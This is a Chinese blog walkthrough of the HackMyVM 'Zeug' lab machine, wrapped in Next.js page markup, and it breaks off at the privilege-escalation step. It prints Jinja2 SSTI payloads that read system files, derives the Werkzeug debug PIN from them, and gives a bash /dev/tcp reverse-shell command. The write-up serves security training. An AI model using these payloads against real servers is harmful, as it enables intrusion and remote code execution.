<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Zeug.

 https://hackmyvm.eu/machines/machine.php?vm=Zeug
 

Notes：Enjoy it, you can do it :D

该靶机有和`Leet` （https://hackmyvm.eu/machines/machine.php?vm=Leet）一样的操作，爆破 PIN 值，所以一块做了。

前期踩点







看样子`FTP`..." data-next-head=""/><meta property="og:title" content="HackMyVM - Zeug" data-next-head=""/><meta property="og:description" content="Zeug.

 https://hackmyvm.eu/machines/machine.php?vm=Zeug
 

Notes：Enjoy it, you can do it :D

该靶机有和`Leet` （https://hackmyvm.eu/machines/machine.php?vm=Leet）一样的操作，爆破 PIN 值，所以一块做了。

前期踩点







看样子`FTP`..." data-next-head=""/><meta property="og:url" content="https://sunsetaction.top/2025/04/22/HackMyVMZeug" data-next-head=""/><meta property="og:type" content="article" data-next-head=""/><meta property="article:published_time" content="2025-04-22" data-next-head=""/><meta property="article:modified_time" content="2025-04-22" data-next-head=""/><meta property="article:section" content="靶机" data-next-head=""/><meta property="article:tag" content="Linux靶机" data-next-head=""/><meta property="article:tag" content="HackMyVM" data-next-head=""/><meta property="article:tag" content="Werkzeug" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="HackMyVM - Zeug" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top/2025/04/22/HackMyVMZeug" data-next-head=""/><title data-next-head="">HackMyVM - Zeug</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/951-ad0cb56524ddaaf1.js" defer=""></script><script src="/_next/static/chunks/pages/%5Byear%5D/%5Bmonth%5D/%5Bday%5D/%5Bid%5D-19a80ecec622553d.js" defer=""></script><script src="/_next/static/CzrQjS_POKRQkVUGFJThI/_buildManifest.js" defer=""></script><script src="/_next/static/CzrQjS_POKRQkVUGFJThI/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full relative"><div class="flex justify-center"><article class="w-full md:w-3/4 lg:w-2/3 xl:w-4xl px-3 mt-5 md:mt-15 max-w-[800px]"><h1 class="text-xl md:text-2xl font-bold text-red-700 dark:text-red-400">HackMyVM - Zeug</h1><div class="flex flex-col"><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">SUNSET</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">2025-04-22</p><p class="font-thin text-gray-600 dark:text-gray-300 ml-2 md:text-base">(Updated:<!-- -->2025-04-22<!-- -->)</p></div><div class="flex text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Category:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">靶机</span></div><div class="flex flex-wrap text-sm mt-1"><p class="font-bold text-gray-600 dark:text-gray-300 md:text-base">Tags:</p><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Linux靶机</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">HackMyVM</span><span data-slot="badge" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&amp;&gt;svg]:size-3 gap-1 [&amp;&gt;svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-secondary [a&amp;]:hover:bg-secondary/90 ml-2 md:text-sm text-gray-700 dark:text-gray-300">Werkzeug</span></div></div><div class="my-8 text-center">加载中...</div></article></div></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMZeug","contentHtml":"\u003ch1\u003eZeug.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Zeug\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Zeug\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes：\u003cstrong\u003eEnjoy it, you can do it :D\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e该靶机有和\u003ccode\u003eLeet\u003c/code\u003e （\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Leet%EF%BC%89%E4%B8%80%E6%A0%B7%E7%9A%84%E6%93%8D%E4%BD%9C%EF%BC%8C%E7%88%86%E7%A0%B4\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Leet）一样的操作，爆破\u003c/a\u003e PIN 值，所以一块做了。\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Zeug nmap -sP 192.168.56.0/24                   \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 03:59 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00062s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00042s latency).\nMAC Address: 08:00:27:4D:B4:0B (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.48\nHost is up (0.00048s latency).\nMAC Address: 08:00:27:FE:97:B0 (Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Zeug nmap -sT -min-rate 10000 -p- 192.168.56.48 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 04:00 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.48\nHost is up (0.00052s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n5000/tcp open  upnp\nMAC Address: 08:00:27:FE:97:B0 (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 10.73 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Zeug nmap -sT -A -T4 -O -p 21,5000 192.168.56.48                                                                \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 04:00 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.48\nHost is up (0.00045s latency).                                                                                    \n                                                         \nPORT     STATE  SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0             109 Jan 06  2024 README.txt\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:192.168.56.4\n|      Logged \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e as ftp\n|      TYPE: ASCII\n|      No session bandwidth \u003cspan class=\"hljs-built_in\"\u003elimit\u003c/span\u003e\n|      Session \u003cspan class=\"hljs-built_in\"\u003etimeout\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status         \n5000/tcp open   upnp?       \n| fingerprint-strings:                                 \n|   GetRequest:                                                                                                   \n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/3.0.1 Python/3.11.2                                                                        \n|     Date: Tue, 22 Apr 2025 08:01:06 GMT                                                                                                                                                                                           \n|     Content-Type: text/html; charset=utf-8      .....\nRunning: Linux 4.X|5.X            \nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5                                                   \nOS details: Linux 4.15 - 5.8                             \nNetwork Distance: 1 hop        \n                                                         \nTRACEROUTE                  \nHOP RTT     ADDRESS                                    \n1   0.45 ms 192.168.56.48                                                                                         \n                                                         \nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .             \nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 101.59 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e看样子\u003ccode\u003eFTP\u003c/code\u003e运行匿名访问，并且\u003ccode\u003e5000\u003c/code\u003e端口是\u003ccode\u003eWerkzeug\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003eFTP\u003c/h2\u003e\n\u003cp\u003e里面只有一个文件\u003ccode\u003eREADME.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Zeug \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e README.txt        \nHi, Cosette, don\u003cspan class=\"hljs-string\"\u003e't forget to disable the debug mode in the web application, we don'\u003c/span\u003et want security breaches.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e嗨，Cosette，不要忘记禁用 Web 应用程序中的调试模式，我们不希望出现安全漏洞。\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e也就是告诉我们\u003ccode\u003eWerkzeug\u003c/code\u003e 开启了调试模式。\u003c/p\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003cp\u003e访问主页\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMZeug/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e是一个文件上传点，先测试一下。\u003c/p\u003e\n\u003ch3\u003eSSTI\u003c/h3\u003e\n\u003cp\u003e因为提示的是 \u003cstrong\u003eRendering HTML templates\u003c/strong\u003e，只能上传\u003ccode\u003eHTML\u003c/code\u003e文件，并且是使用 \u003ccode\u003eflask\u003c/code\u003e 搭建的，所以尝试了下 \u003ccode\u003e{{7*7}}\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e结果显示存在模板注入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMZeug/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003ecurl\u003c/code\u003e 实现\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Zeug curl -X POST \u003cspan class=\"hljs-string\"\u003e'192.168.56.48:5000'\u003c/span\u003e -d $\u003cspan class=\"hljs-string\"\u003e'------geckoformboundary8c6d91c92627c3d7be91b3ccbedbbfde\\nContent-Disposition: form-data; name=\"file\"; filename=\"index.html\"\\n\\n{{7*7}}\\n------geckoformboundary8c6d91c92627c3d7be91b3ccbedbbfde--'\u003c/span\u003e -H \u003cspan class=\"hljs-string\"\u003e'Content-Type: multipart/form-data; boundary=----geckoformboundary8c6d91c92627c3d7be91b3ccbedbbfde'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMZeug/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eSSTImap\u003c/code\u003e 爆破无果，还得手动\u003c/p\u003e\n\u003cp\u003e手动测试后是 \u003ccode\u003ejinja2\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{{7*\u003cspan class=\"hljs-string\"\u003e'7'\u003c/span\u003e}} \u003cspan class=\"hljs-comment\"\u003e# 77777\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在 \u003ca href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md\"\u003ehttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md\u003c/a\u003e 中随便找找 \u003ccode\u003epayloads\u003c/code\u003e 最后文件读取的可以直接使用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{{ get_flashed_messages.__globals__.__builtins__.open(\u003cspan class=\"hljs-string\"\u003e\"/etc/passwd\"\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e() }}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e\u003cstrong\u003eWerkzeug\u003c/strong\u003e PIN Bypass\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003e/console\u003c/code\u003e 就是 \u003ccode\u003eWerkzeug\u003c/code\u003e 了，需要 PIN 码，并且我们可以任意文件读取\u003c/p\u003e\n\u003cp\u003e链接：\u003ca href=\"https://github.com/wdahlenburg/werkzeug-debug-console-bypass\"\u003ehttps://github.com/wdahlenburg/werkzeug-debug-console-bypass\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWerkzeug has a debug console that requires a pin by default. It's possible to bypass this with an LFI vulnerability or use it as a local privilege escalation vector. The debug console will lock after 10 invalid attempts which requires the server to be restarted for another 10 guesses.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003eWerkzeug 有一个默认需要 pin 的调试控制台。可以使用 LFI 漏洞绕过此问题，或将其用作本地权限提升向量。调试控制台将在 10 次无效尝试后锁定，这需要重新启动服务器以再进行 10 次猜测。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e根据文档，我们要得到：\u003ccode\u003eusername\u003c/code\u003e ，\u003ccode\u003eFlask\u003c/code\u003e ，获取服务器托管的接口的 \u003ccode\u003eMac\u003c/code\u003e 地址，Machine_id\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eusername\u003c/code\u003e：\u003ccode\u003ewww-data\u003c/code\u003e或者\u003ccode\u003eCosette\u003c/code\u003e （\u003ccode\u003eREADME\u003c/code\u003e中得到）\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eFlask\u003c/code\u003e 的正确路径：在错误中能看到：\u003ccode\u003e/home/cosette/zeug/venv/lib/python3.11/site-packages/flask/app.py\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e获取服务器托管的接口的 \u003ccode\u003eMac\u003c/code\u003e 地址：也就是网卡的物理地址\u003c/p\u003e\n\u003cp\u003e现在需要获取网卡的\u003ccode\u003eMAC\u003c/code\u003e地址，因为靶机系统是\u003ccode\u003eDebian\u003c/code\u003e ，所以配置文件在\u003ccode\u003e/etc/network/interfaces\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{{ get_flashed_messages.__globals__.__builtins__.open(\u003cspan class=\"hljs-string\"\u003e\"/etc/network/interfaces\"\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e() }}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e有三张网卡\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-comment\"\u003e# This file describes the network interfaces available on your system\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# and how to activate them. For more information, see interfaces(5).\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e /etc/network/interfaces.d/*\n\n\u003cspan class=\"hljs-comment\"\u003e# The loopback network interface\u003c/span\u003e\nauto lo\niface lo inet loopback\n\n\u003cspan class=\"hljs-comment\"\u003e# The primary network interface\u003c/span\u003e\nallow-hotplug enp0s3\niface enp0s3 inet dhcp\n\nallow-hotplug ens33\niface ens33 inet dhcp\n\nallow-hotplug enp0s8\niface enp0s8 inet dhcp\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取网卡的 \u003ccode\u003eMAC\u003c/code\u003e ，这里只能读到\u003ccode\u003eenp0s3\u003c/code\u003e的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{{ get_flashed_messages.__globals__.__builtins__.open(\u003cspan class=\"hljs-string\"\u003e\"/sys/class/net/enp0s3/address\"\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e() }}\n08:00:27:fe:97:b0\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e转换为\u003ccode\u003e10\u003c/code\u003e进制\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003e\u003e\u003e \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'08:00:27:fe:97:b0'\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003esplit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\":\"\u003c/span\u003e))\n\u003cspan class=\"hljs-string\"\u003e'080027fe97b0'\u003c/span\u003e\n\u003e\u003e\u003e \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(0x080027fe97b0)\n8796764018608\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eMachine_id\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{{ get_flashed_messages.__globals__.__builtins__.open(\u003cspan class=\"hljs-string\"\u003e\"/etc/machine-id\"\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e() }}\n48329e233f524ec291cce7479927890b\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{{ get_flashed_messages.__globals__.__builtins__.open(\u003cspan class=\"hljs-string\"\u003e\"/proc/sys/kernel/random/boot_id\"\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e() }}\n15ca1b89-3fc2-4e10-808d-ffb4abea4bdc\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e{{ get_flashed_messages.__globals__.__builtins__.open(\u003cspan class=\"hljs-string\"\u003e\"/proc/self/cgroup\"\u003c/span\u003e).\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e() }}\n0::/system.slice/zeug-app.service\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"48329e233f524ec291cce7479927890b\"\u003c/span\u003e \u003e machine-id                               \n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"15ca1b89-3fc2-4e10-808d-ffb4abea4bdc\"\u003c/span\u003e \u003e boot_id                                   \n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"0::/system.slice/zeug-app.service\"\u003c/span\u003e \u003e cgroup \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emachine_id = b\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e filename \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"machine-id\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"boot_id\"\u003c/span\u003e:\n    try:\n        with open(filename, \u003cspan class=\"hljs-string\"\u003e\"rb\"\u003c/span\u003e) as f:\n            value = f.readline().strip()\n    except OSError:\n        \u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e value:\n        machine_id += value\n        \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\ntry:\n    with open(\u003cspan class=\"hljs-string\"\u003e\"cgroup\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"rb\"\u003c/span\u003e) as f:\n        machine_id += f.readline().strip().rpartition(b\u003cspan class=\"hljs-string\"\u003e\"/\"\u003c/span\u003e)[2]\nexcept OSError:\n    pass\n\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(machine_id)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython getID.py \nb\u003cspan class=\"hljs-string\"\u003e'48329e233f524ec291cce7479927890bzeug-app.service'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过链接中的脚本获得 \u003ccode\u003ePIN\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython werkzeug-pin-bypass.py \nPin: 690-793-473\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e\u003cstrong\u003eWerkzeug console 利用\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e输入 PIN 后，可以进行反弹 \u003ccode\u003eshell\u003c/code\u003e 了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport os;os.system(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.4/1234 0\u003e\u0026#x26;1'\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Zeug nc -lvp 1234\nlistening on [any] 1234 ...\n192.168.56.48: inverse host lookup failed: Unknown host\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.48] 44856\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (471): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\ncosette@zeug:~/zeug$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - to exia\u003c/h2\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecosette@zeug:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e cosette on zeug:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser cosette may run the following commands on zeug:\n    (exia) NOPASSWD: /home/exia/seed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以以\u003ccode\u003eexia\u003c/code\u003e权限执行\u003ccode\u003e/home/exia/seed\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs 